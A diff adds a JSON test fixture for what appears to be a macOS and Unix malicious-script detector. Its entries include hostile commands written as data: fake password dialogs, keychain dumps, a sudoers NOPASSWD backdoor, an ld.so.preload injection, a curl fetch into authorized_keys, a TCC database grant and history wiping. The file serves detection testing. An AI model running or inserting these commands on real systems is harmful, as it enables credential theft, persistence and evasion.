@@ -1,0 +1,109 @@
+[
+  {
+    "name": "unix_password_prompt.sh",
+    "text": "osascript -e 'display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer'\n",
+    "expected": "macos_password_prompt"
+  },
+  {
+    "name": "unix_password_prompt.scpt",
+    "text": "set pw to text returned of (display dialog \"Enter your password\" default answer \"\" with icon caution buttons {\"OK\"} default button \"OK\" with hidden answer)\n",
+    "expected": "macos_password_prompt"
+  },
+  {
+    "name": "unix_password_prompt_utf16.bin",
+    "text": "display dialog \"Enter your password\" default answer \"\" with hidden answer\n",
+    "expected": "macos_password_prompt",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "unix_dialog_benign.sh",
+    "text": "osascript -e 'display dialog \"Backup finished\" buttons {\"OK\"}'\n",
+    "expected": null
+  },
+  {
+    "name": "unix_input_benign.scpt",
+    "text": "set name to text returned of (display dialog \"Project name?\" default answer \"\")\n",
+    "expected": null
+  },
+  {
+    "name": "unix_hidden_no_password.scpt",
+    "text": "set token to text returned of (display dialog \"Paste the API token\" default answer \"\" with hidden answer)\n",
+    "expected": null
+  },
+  {
+    "name": "unix_keychain_dump.sh",
+    "text": "security find-generic-password -ga 'Chrome' | grep password\n",
+    "expected": "macos_keychain_dump"
+  },
+  {
+    "name": "unix_keychain_internet.sh",
+    "text": "security find-internet-password -s example.invalid -w\n",
+    "expected": "macos_keychain_dump"
+  },
+  {
+    "name": "unix_keychain_dumpall.sh",
+    "text": "security dump-keychain -d login.keychain-db\n",
+    "expected": "macos_keychain_dump"
+  },
+  {
+    "name": "unix_keychain_metadata.sh",
+    "text": "security find-generic-password -s Chrome\n",
+    "expected": null
+  },
+  {
+    "name": "unix_keychain_cert.sh",
+    "text": "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain cert.pem\n",
+    "expected": null
+  },
+  {
+    "name": "unix_sudoers.sh",
+    "text": "echo \"$USER ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers\n",
+    "expected": "unix_privilege_persistence"
+  },
+  {
+    "name": "unix_preload.sh",
+    "text": "echo /tmp/.x.so >> /etc/ld.so.preload\n",
+    "expected": "unix_privilege_persistence"
+  },
+  {
+    "name": "unix_authorized_keys.sh",
+    "text": "curl -s https://example.invalid/k >> ~/.ssh/authorized_keys\n",
+    "expected": "unix_privilege_persistence"
+  },
+  {
+    "name": "unix_tcc.sh",
+    "text": "sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \"insert into access values ('kTCCServiceScreenCapture','com.x',0,2,0,1,null,null,0,'UNUSED',null,0,0)\"\n",
+    "expected": "unix_privilege_persistence"
+  },
+  {
+    "name": "unix_history_wipe.sh",
+    "text": "unset HISTFILE; history -c; rm -f ~/.bash_history\n",
+    "expected": "unix_privilege_persistence"
+  },
+  {
+    "name": "unix_history_wipe.zip",
+    "text": "export HISTFILE=/dev/null && history -c\n",
+    "expected": "unix_privilege_persistence",
+    "container": "zip"
+  },
+  {
+    "name": "unix_authorized_keys_benign.sh",
+    "text": "cat id_ed25519.pub >> ~/.ssh/authorized_keys\n",
+    "expected": null
+  },
+  {
+    "name": "unix_sudoers_mention.md",
+    "text": "Never add a NOPASSWD: ALL line to /etc/sudoers on a shared host.\n",
+    "expected": null
+  },
+  {
+    "name": "unix_history_benign.sh",
+    "text": "history | tail -20\n",
+    "expected": null
+  },
+  {
+    "name": "unix_visudo.sh",
+    "text": "sudo visudo\n",
+    "expected": null
+  }
+]
